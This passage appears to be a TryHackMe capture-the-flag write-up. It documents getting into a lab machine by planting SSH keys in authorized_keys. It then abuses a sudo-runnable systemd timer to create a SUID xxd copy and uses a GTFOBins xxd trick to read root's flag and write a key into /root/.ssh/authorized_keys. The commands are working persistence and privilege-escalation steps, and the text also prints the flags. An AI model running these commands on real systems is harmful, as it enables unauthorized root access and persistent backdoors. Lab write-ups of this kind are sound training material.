![image](https://github.com/user-attachments/assets/543010f0-cb4b-4242-b643-8e09ec9dfbbd)

```
/home/comte/.ssh/authorized_keys
```

this file is empty we will make ssh key and put it in it so we can use this ssh key to access machine as ``comte``

```
ssh-keygen -t rsa
```

![image](https://github.com/user-attachments/assets/c1c3839c-4c96-4cea-accf-1e9d59bd7f86)

![image](https://github.com/user-attachments/assets/09414d4f-30ae-4a73-b24e-da50fd39dd46)

put this in ``/authorized_keys``

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMXJ7nSUUiquqfFUcZxwio/N4IW+7A3t8vD6+R5SUvUl1zQVKKcLkRxb30bWeVSYrwYWI0A5Wxs5P8vXLIaQCYcA9z5gmtuOpqHsIOOzYQ3i2DXe5a0uvfKXWQsa83bug3mEjoj26rvbM2xdn/I6pIws5cLXh2TS8cnhKjiiAnfx1tcAfo7q2hRv/CTV/fKH2/7YNzu24DVE15wk0g/XobMJH4QV0ZYQvM1pdUe6MU5pT0ewperIsXHkUW4Qu0SFv3SzvjMJ9GPEyWHBv5xdFpHwscrSrVIr4x4nTqgpSKOXOQVR/iV3klzD5roigxLJ8hKMKP2qAY5j0e94TjEtDx+yyqnK2SjW6oe7WqOStb3hrfVXn9O9IrOaG9npd+6+vqG2wO3LNUfW2kRK4ratXMXuo6nFJ8Y7VJestcJ+mXolKZV6yQgLUmjl/8JwhtRMzsXuRblQ7i3KkSRXBvjLuve4+FJhruBbIPNIKqgr9TurRBXgDOvC8ujidgsX0pQwM= kali@kali
```

![image](https://github.com/user-attachments/assets/b49e280d-30a2-470a-8500-d842f6139922)

after that login with ssh :

```
ssh -i id_rsa comte@10.10.180.156
```

![image](https://github.com/user-attachments/assets/911da338-c50e-4c51-aaee-4cb527270d50)

![image](https://github.com/user-attachments/assets/2fe5f87f-2f17-4e8b-ba9a-0fc458012ae6)

first flag 😝

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```

![image](https://github.com/user-attachments/assets/0f3f335e-ec60-47b3-96b6-c22545fa7c85)

oh so now will return to this ``/etc/systemd/system/exploit.timer`` and ``/etc/systemd/system/exploit.service``

![image](https://github.com/user-attachments/assets/c7fc67bb-ef75-4462-8404-58aa6d17051a)

try to start ``exploit.timer``: 

![image](https://github.com/user-attachments/assets/876553c6-c0e8-4b7e-98ae-831053c5f9c1)

i search on ``gtfobins`` about ``xxd`` found :

![image](https://github.com/user-attachments/assets/372df282-6aac-4a50-84f6-8985bc685008)

but it still can't work because we don't have passowrd of comte

if you look again to ``exploit.timer`` The value for **``OnBootSec``** is not set, which triggers the error.

![image](https://github.com/user-attachments/assets/60b8772e-76ab-4eaf-9088-a5c0b78c5d56)

We correct this by setting ``OnUnitActiveSec=0`` and ``OnBootSec=0``. This triggers the service immediately after execution.

```
[Unit]
Description=Exploit Timer

[Timer]
OnUnitActiveSec=0
OnBootSec=0

[Install]
WantedBy=timers.target
```

We run the service as follows, which copies the xxd to /opt and sets the SUID bit, recognisable by the red background.

```
sudo /bin/systemctl enable exploit.timer
```

```
sudo /bin/systemctl restart exploit.timer
```

```
cd /opt
```

![image](https://github.com/user-attachments/assets/0e885ef4-c947-46c7-9f19-1418c457d37e)

now write exploit form ``gtfobins``

```
LFILE=/root/root.txt
./xxd "$LFILE" | xxd -r
```

![image](https://github.com/user-attachments/assets/7faf0ac4-49a3-42ee-bfc7-2c1a87840e75)

```
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|

THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

Boom last flag !!! 

``but wait still not root ``

First, we generate a simple password using ssh-keygen using the following command:

```
ssh-keygen -t rsa
```

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOryhrHn09cLM3viJUjAfbWLtjlP6B850w1RP617G5K+hZbpjJZq82BcDo+Jp+m62tE/4x6qfy9FwOmwPqlt6+uJjsIvqR7jwTQx5rrA06IQ0xS1D1EqvPrZ6EXWHF6q1uZO+Z4N4wsx84WzES1XyLmlOcOnGJCsQFkVvECUhkBqm04BFUomsJzssKr2+lvc0HwvgbeyWKXnzqRz1597NIDFhVzYVJqRKDem20xer2UeusXRKpvY8BmbWYncZpGXGvWF4Ivx1CcJ4Gld4VIFEr2TekdW91M7dBTTVrPxtQKdqFGO2TXDe/MjAF+GLx3vP287b1S57F+pWBPxYn1t+F5CmuWo1afOC3AINSeUc0VuD1JBymAIf2PVO2M1sPYApAXIkBTOmQaAVOHgzu3giIoI+1TvVQHSns124NvRCujUpE+lBKPMy1MqvW88LSLWoeIRx/Np9iN6cGWiDJKhdkxSs/rrVyKWrtdev4SBpVNFiZuYbkto9d9fRKNo32tFs= kali@kali
```

![image](https://github.com/user-attachments/assets/1dbd3f31-f8d6-4995-8514-4cd38ef52407)

We can leverage this to add an SSH key for the root user.

```
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOryhrHn09cLM3viJUjAfbWLtjlP6B850w1RP617G5K+hZbpjJZq82BcDo+Jp+m62tE/4x6qfy9FwOmwPqlt6+uJjsIvqR7jwTQx5rrA06IQ0xS1D1EqvPrZ6EXWHF6q1uZO+Z4N4wsx84WzES1XyLmlOcOnGJCsQFkVvECUhkBqm04BFUomsJzssKr2+lvc0HwvgbeyWKXnzqRz1597NIDFhVzYVJqRKDem20xer2UeusXRKpvY8BmbWYncZpGXGvWF4Ivx1CcJ4Gld4VIFEr2TekdW91M7dBTTVrPxtQKdqFGO2TXDe/MjAF+GLx3vP287b1S57F+pWBPxYn1t+F5CmuWo1afOC3AINSeUc0VuD1JBymAIf2PVO2M1sPYApAXIkBTOmQaAVOHgzu3giIoI+1TvVQHSns124NvRCujUpE+lBKPMy1MqvW88LSLWoeIRx/Np9iN6cGWiDJKhdkxSs/rrVyKWrtdev4SBpVNFiZuYbkto9d9fRKNo32tFs= kali@kali' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
```

```
ssh -i id_rsa root@10.10.180.156
```

![image](https://github.com/user-attachments/assets/8cae4516-f4cf-4aaa-97f2-16b02072ffae)

Booooooooom !!!!  i'm rooooot 

![YayMinionsGIF](https://github.com/user-attachments/assets/559ac9ac-b866-4e49-a123-b31636877939)

